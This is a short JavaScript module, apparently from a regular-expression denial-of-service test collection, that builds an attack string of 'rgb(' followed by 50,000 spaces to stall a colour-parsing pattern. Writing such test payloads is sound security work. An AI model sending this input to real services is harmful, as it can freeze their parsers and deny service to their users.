function getPayload() {
  const genstr = require("../utils").genstr;

  let attack_str = "rgb(" + genstr(50000, " ") + "";

  return { attack_str };
}

module.exports = { getPayload };